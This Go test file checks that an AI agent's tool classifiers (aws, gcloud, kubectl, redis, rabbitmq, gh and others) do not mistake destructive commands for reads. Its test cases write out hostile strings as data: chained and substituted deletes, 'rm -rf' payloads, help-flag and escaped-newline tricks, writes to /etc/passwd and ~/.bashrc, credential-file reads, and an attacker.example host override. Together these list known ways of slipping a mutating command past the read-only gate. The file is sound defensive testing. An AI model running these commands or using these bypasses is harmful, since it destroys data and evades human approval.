package tools

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"nudgebee/llm/security"
	"nudgebee/llm/tools/core"
)

// TestStaticClassifiersDoNotReadMutationsAsRead runs the bypasses reported in
// #39880 (C3 shell syntax, C4 help flags, C5 escaped newlines) through each
// tool's static classifier. None of them may come back as read; "" sends the
// command on to the LLM classifier.
func TestStaticClassifiersDoNotReadMutationsAsRead(t *testing.T) {
	ctx := security.NewRequestContext(context.Background(), nil, nil, nil, nil)
	type classifier interface {
		InferToolRequestType(*security.RequestContext, string, string) (core.ToolRequestType, error)
	}
	cases := []struct {
		name    string
		tool    classifier
		command string
	}{
		// C3: the command runs through a shell.
		{"aws chain", AwsCliTool{}, "aws ec2 describe-instances; aws ec2 terminate-instances --instance-ids i-1"},
		{"aws and", AwsCliTool{}, "aws s3 ls && aws s3 rb s3://bucket --force"},
		{"aws substitution", AwsCliTool{}, "aws s3 ls $(aws s3 rb s3://bucket --force)"},
		{"aws newline", AwsCliTool{}, "aws s3 ls\naws s3 rb s3://bucket --force"},
		{"az chain", AzureCliTool{}, "az vm list && az vm delete -n vm1 -g rg --yes"},
		{"gcloud chain", GcpCliTool{}, "gcloud compute instances list; gcloud compute instances delete vm1 --quiet"},
		{"bq chain", GcpCliTool{}, "bq query 'select 1'; bq rm -f -t ds.table"},
		// C4: a help flag that is not a help request.
		{"aws commented help", AwsCliTool{}, "aws ec2 terminate-instances --instance-ids i-1 # --help"},
		{"aws trailing -h after flags", AwsCliTool{}, "aws ec2 terminate-instances --instance-ids i-1 -h"},
		{"aws ssm payload -h", AwsCliTool{}, `aws ssm send-command --document-name AWS-RunShellScript --parameters commands=["rm -rf /data -h"]`},
		{"gcloud ssh command -h", GcpCliTool{}, `gcloud compute ssh vm1 --command "rm -rf /data" -h`},
		{"az run-command -h", AzureCliTool{}, `az vm run-command invoke -g rg -n vm1 --command-id RunShellScript --scripts "rm -rf /data" -h`},
		{"kubectl help as flag value", KubectlExecuteTool{}, "kubectl delete pod x --cascade -h"},
		{"kubectl help after exec separator", KubectlExecuteTool{}, "kubectl exec pod -- rm -rf /data -h"},
		{"helm help as flag value", HelmExecuteTool{}, "helm uninstall rel --description -h"},
		{"argocd help after flag", ArgoCDExecuteTool{}, "argocd app delete x --cascade -h"},
		{"redis trailing help is a key", RedisExecuteTool{}, "redis-cli DEL session --help"},
		{"rabbitmq-api trailing -h goes to curl", RabbitExecuteTool{}, "rabbitmq-api DELETE /api/queues/%2F/q1 -h"},
		// C5: gh/glab turn a literal \n into a newline before running.
		{"gh escaped newline", GithubCliTool{}, `gh pr list \n rm -rf ~`},
		{"glab escaped newline", GitlabCliTool{}, `glab mr list \n rm -rf ~`},
		// C6: RabbitMQ forms that write while looking like a read.
		{"rabbitmq-api method override", RabbitExecuteTool{}, "rabbitmq-api GET /api/queues/%2F/q1 -X DELETE"},
		{"rabbitmq-api extra url", RabbitExecuteTool{}, "rabbitmq-api GET /api/overview http://collector.example.com/"},
		{"rabbitmqadmin get ack without requeue", RabbitExecuteTool{}, "rabbitmqadmin get queue=q1 ackmode=ack_requeue_false"},
		{"rabbitmqadmin get reject without requeue", RabbitExecuteTool{}, "rabbitmqadmin get queue=q1 count=5 ackmode=reject_requeue_false"},
		{"rabbitmqadmin get requeue false", RabbitExecuteTool{}, "rabbitmqadmin get queue=task_queue requeue=false"},
		{"rabbitmqadmin get ack-mode flag", RabbitExecuteTool{}, "rabbitmqadmin get --queue q1 --ack-mode ack_requeue_false"},
		{"rabbitmqadmin get flag before ack-mode", RabbitExecuteTool{}, "rabbitmqadmin get --queue --ack-mode ack_requeue_false"},
		{"rabbitmqadmin get flag before requeue setting", RabbitExecuteTool{}, "rabbitmqadmin get --verbose requeue=false"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			input, err := json.Marshal(map[string]string{"command": tc.command})
			require.NoError(t, err)
			got, err := tc.tool.InferToolRequestType(ctx, "", string(input))
			require.NoError(t, err)
			assert.NotEqual(t, core.ToolRequestTypeRead, got, tc.command)
		})
	}
}

// TestStaticClassifiersStillReadPlainReads guards the other direction: genuine
// help requests and reads keep their static answer.
func TestStaticClassifiersStillReadPlainReads(t *testing.T) {
	ctx := security.NewRequestContext(context.Background(), nil, nil, nil, nil)
	type classifier interface {
		InferToolRequestType(*security.RequestContext, string, string) (core.ToolRequestType, error)
	}
	cases := []struct {
		name    string
		tool    classifier
		command string
	}{
		{"aws describe", AwsCliTool{}, "aws ec2 describe-instances --region us-east-1"},
		{"aws quoted query", AwsCliTool{}, `aws ec2 describe-instances --query 'Reservations[].Instances[].{ID:InstanceId}'`},
		{"aws version", AwsCliTool{}, "aws --version"},
		{"az help", AzureCliTool{}, "az vm delete --help"},
		{"gcloud help", GcpCliTool{}, "gcloud compute instances delete -h"},
		{"kubectl help", KubectlExecuteTool{}, "kubectl delete pod x -h"},
		{"kubectl get", KubectlExecuteTool{}, "kubectl get pods -n prod -o wide"},
		{"kubectl quoted hash", KubectlExecuteTool{}, `kubectl get pods -o jsonpath='{.items[*].metadata.name} #x'`},
		{"helm help", HelmExecuteTool{}, "helm uninstall --help"},
		{"argocd help", ArgoCDExecuteTool{}, "argocd app delete -h"},
		{"gh list", GithubCliTool{}, "gh pr list --state open"},
		{"gh quoted newline", GithubCliTool{}, `gh pr view 12 --comments --jq ".body\n"`},
		{"redis help command", RedisExecuteTool{}, "redis-cli help"},
		{"redis bare command", RedisExecuteTool{}, "PING"},
		{"redis info", RedisExecuteTool{}, "redis-cli INFO memory"},
		{"rabbitmq-api plain get", RabbitExecuteTool{}, "rabbitmq-api GET /api/queues"},
		{"rabbitmqadmin list", RabbitExecuteTool{}, "rabbitmqadmin list queues name consumers"},
		{"rabbitmqadmin get requeues by default", RabbitExecuteTool{}, "rabbitmqadmin get queue=q1 count=1"},
		{"rabbitmqadmin get explicit requeue", RabbitExecuteTool{}, "rabbitmqadmin get queue=q1 ackmode=ack_requeue_true"},
		{"rabbitmqadmin get queue lookup", RabbitExecuteTool{}, "rabbitmqadmin get queue name=q1 vhost=/"},
		{"rabbitmqadmin get queue named requeue", RabbitExecuteTool{}, "rabbitmqadmin get --queue requeue"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			input, err := json.Marshal(map[string]string{"command": tc.command})
			require.NoError(t, err)
			got, err := tc.tool.InferToolRequestType(ctx, "", string(input))
			require.NoError(t, err)
			assert.Equal(t, core.ToolRequestTypeRead, got, tc.command)
		})
	}
}

// TestRedisClassifiesTheCommandItRuns checks that the Redis tool runs the
// string its classifier read. A redis-cli placed after another command used to
// make the tool run the input as given, so the shell ran that other command.
func TestRedisClassifiesTheCommandItRuns(t *testing.T) {
	assert.Equal(t, "redis-cli INFO", redisCommandAsRun("redis-cli INFO"))
	assert.Equal(t, "redis-cli PING", redisCommandAsRun("  PING "))
	assert.Equal(t, "redis-cli command bash -c 'id' redis-cli", redisCommandAsRun("command bash -c 'id' redis-cli"))
	assert.Equal(t, "redis-cli /tmp/x/redis-cli INFO", redisCommandAsRun("/tmp/x/redis-cli INFO"))
}

// TestRedisCallParsesPaddedJSON: JSON input with leading whitespace is still
// JSON to Call. Read as a raw command instead, its later lines would run as
// shell commands the classifier never saw.
func TestRedisCallParsesPaddedJSON(t *testing.T) {
	_, err := RedisExecuteTool{}.Call(core.NbToolContext{Ctx: security.NewRequestContext(context.Background(), nil, nil, nil, nil)},
		core.NBToolCallRequest{Command: " \n{\"x\":1}"})
	require.Error(t, err)
	assert.Contains(t, err.Error(), "command is empty", "padded JSON without a command must be rejected, not run as text")
}

// TestRabbitArgsInputIsClassified covers the {"args": ...} input shape most
// RabbitMQ calls use.
func TestRabbitArgsInputIsClassified(t *testing.T) {
	ctx := security.NewRequestContext(context.Background(), nil, nil, nil, nil)
	got, err := RabbitExecuteTool{}.InferToolRequestType(ctx, "", `{"args": "get queue=q1 ackmode=ack_requeue_false", "instance": "rabbit-test"}`)
	require.NoError(t, err)
	assert.Equal(t, core.ToolRequestTypeUpdate, got)
	got, err = RabbitExecuteTool{}.InferToolRequestType(ctx, "", `{"args": "list queues", "instance": "rabbit-test"}`)
	require.NoError(t, err)
	assert.Equal(t, core.ToolRequestTypeRead, got)
}

// TestCLIChainsAreClassifiedPerStage: a chained or piped command sent to a CLI
// tool is classified stage by stage when every stage is that CLI or a text
// utility; the strongest stage wins. Anything else is left to the LLM ("").
func TestCLIChainsAreClassifiedPerStage(t *testing.T) {
	ctx := security.NewRequestContext(context.Background(), nil, nil, nil, nil)
	type classifier interface {
		InferToolRequestType(*security.RequestContext, string, string) (core.ToolRequestType, error)
	}
	cases := []struct {
		name    string
		tool    classifier
		command string
		want    core.ToolRequestType
	}{
		{"aws piped to grep", AwsCliTool{}, "aws s3 ls | grep backup", core.ToolRequestTypeRead},
		{"aws read chain", AwsCliTool{}, "aws events describe-rule --name r1 && aws events list-targets-by-rule --rule r1", core.ToolRequestTypeRead},
		{"aws stderr merged", AwsCliTool{}, "aws ec2 describe-instances 2>&1 | grep InstanceId", core.ToolRequestTypeRead},
		{"aws stderr discarded", AwsCliTool{}, "aws s3 ls 2>/dev/null | head -n 5", core.ToolRequestTypeRead},
		{"aws output to a file", AwsCliTool{}, "aws s3 ls > /tmp/x", ""},
		{"aws piped to jq", AwsCliTool{}, "aws ec2 describe-instances | jq env", ""},
		{"aws read then delete", AwsCliTool{}, "aws s3 ls; aws s3 rb s3://bucket --force", core.ToolRequestTypeDelete},
		{"aws commented help", AwsCliTool{}, "aws ec2 terminate-instances --instance-ids i-1 # --help", core.ToolRequestTypeDelete},
		{"aws piped to a shell", AwsCliTool{}, "aws s3 ls | sh", ""},
		{"aws then another cli", AwsCliTool{}, "aws s3 ls && kubectl delete pod x", ""},
		{"aws substitution", AwsCliTool{}, "aws s3 ls $(aws s3 rb s3://bucket --force)", ""},
		{"aws from another path", AwsCliTool{}, "/tmp/x/aws s3 ls | grep a", ""},
		{"aws loop", AwsCliTool{}, "for r in us-east-1 eu-west-1; do aws ec2 describe-instances --region $r; done", ""},
		{"az chain", AzureCliTool{}, "az vm list && az vm delete -n vm1 -g rg --yes", core.ToolRequestTypeDelete},
		{"gcloud piped", GcpCliTool{}, "gcloud compute instances list | grep web", core.ToolRequestTypeRead},
		{"bq stage the static rules do not know", GcpCliTool{}, "bq query 'select 1'; bq rm -f -t ds.table", ""},
		{"kubectl piped to grep", KubectlExecuteTool{}, "kubectl get pods -A | grep api", core.ToolRequestTypeRead},
		{"kubectl events tail", KubectlExecuteTool{}, "kubectl get events -A --sort-by=.metadata.creationTimestamp | tail -n 50", core.ToolRequestTypeRead},
		{"kubectl read then delete", KubectlExecuteTool{}, "kubectl get pods; kubectl delete pod x", core.ToolRequestTypeDelete},
		{"kubectl xargs", KubectlExecuteTool{}, "kubectl get pods -o name | xargs kubectl delete", ""},
		{"kubectl output to a file", KubectlExecuteTool{}, "kubectl get pods > /etc/cron.d/x", ""},
		{"kubectl append to a file", KubectlExecuteTool{}, "kubectl get pods >> ~/.bashrc", ""},
		{"kubectl filter output to a file", KubectlExecuteTool{}, "kubectl get pods | tr a b > x", ""},
		{"kubectl input from a file", KubectlExecuteTool{}, "kubectl get pods < /tmp/x | head", ""},
		{"kubectl sort to a file", KubectlExecuteTool{}, "kubectl get pods -o name | sort -o /etc/passwd", ""},
		{"kubectl sort output flag", KubectlExecuteTool{}, "kubectl get pods | sort --output=/tmp/x", ""},
		{"kubectl sort combined flags", KubectlExecuteTool{}, "kubectl get pods | sort -ro /tmp/x", ""},
		{"kubectl sort program", KubectlExecuteTool{}, "kubectl get pods | sort --compress-program=sh", ""},
		{"kubectl uniq to a file", KubectlExecuteTool{}, "kubectl get pods | uniq - /tmp/out", ""},
		{"kubectl sort uniq", KubectlExecuteTool{}, "kubectl get pods -A | sort -k2 | uniq -c", core.ToolRequestTypeRead},
		{"kubectl or true", KubectlExecuteTool{}, "kubectl get pods | grep api || true", core.ToolRequestTypeRead},
		{"kubectl tee", KubectlExecuteTool{}, "kubectl get pods | tee /tmp/x", ""},
		{"kubectl cat", KubectlExecuteTool{}, "kubectl get pods | cat - ~/.kube/config", ""},
		{"kubectl exec chain stays with llm", KubectlExecuteTool{}, "kubectl exec p -- redis-cli set k v | head", ""},
		{"gh search code", GithubCliTool{}, `gh search code "MemoryTab" --repo o/r`, core.ToolRequestTypeRead},
		{"gh search issues", GithubCliTool{}, `gh search issues "LLM Analyser" --repo o/r --state closed --limit 5`, core.ToolRequestTypeRead},
		{"gh search prs json", GithubCliTool{}, "gh search prs 38183 --owner o --json repository,number,title,url", core.ToolRequestTypeRead},
		{"gh search unknown type", GithubCliTool{}, "gh search everything x", ""},
		{"gh api decoded", GithubCliTool{}, "gh api repos/o/r/contents/a.jsx --jq '.content' | base64 -d", core.ToolRequestTypeRead},
		{"gh api decoded and trimmed", GithubCliTool{}, "gh api repos/o/r/contents/a.jsx --jq .content | base64 -d | head -n 40", core.ToolRequestTypeRead},
		{"gh api decode a file", GithubCliTool{}, "gh api repos/o/r/issues | base64 -d ~/.config/gh/hosts.yml", ""},
		{"gh read then merge", GithubCliTool{}, "gh search prs 12 --repo o/r && gh pr merge 12 --admin", core.ToolRequestTypeUpdate},
		{"gh api post in chain", GithubCliTool{}, "gh api repos/o/r/issues -f title=x | head", core.ToolRequestTypeCreate},
		{"gh piped to python", GithubCliTool{}, "gh pr diff 1 | python3 -c 'import sys'", ""},
		{"gh host override in chain", GithubCliTool{}, "GH_HOST=attacker.example gh api user | head", ""},
		{"kubeconfig override in chain", KubectlExecuteTool{}, "KUBECONFIG=/tmp/x kubectl get pods | head", ""},
		{"aws endpoint override in chain", AwsCliTool{}, "AWS_ENDPOINT_URL=http://x.example aws s3 ls | grep a", ""},
		{"env wrapper in chain", KubectlExecuteTool{}, "env KUBECONFIG=/tmp/x kubectl get pods | head", ""},
		{"sudo in chain", KubectlExecuteTool{}, "sudo kubectl get pods | head", ""},
		{"assignment-only stage", KubectlExecuteTool{}, "X=1; kubectl get pods | head", ""},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			input, err := json.Marshal(map[string]string{"command": tc.command})
			require.NoError(t, err)
			got, err := tc.tool.InferToolRequestType(ctx, "", string(input))
			require.NoError(t, err)
			assert.Equal(t, tc.want, got, tc.command)
		})
	}
	// The workspace proxy decides access with InferKubectlVerbType, which
	// stays single-command.
	assert.Equal(t, core.ToolRequestType(""), InferKubectlVerbType("kubectl get pods -A | grep api"))
}

// The image scan tool only triggers a scan, so it is always a read, decided
// without an LLM call.
func TestImageScanIsStaticRead(t *testing.T) {
	got, err := ImageScanTool{}.InferToolRequestType(security.NewRequestContext(context.Background(), nil, nil, nil, nil), "", `{"workload":"api"}`)
	require.NoError(t, err)
	assert.Equal(t, core.ToolRequestTypeRead, got)
}
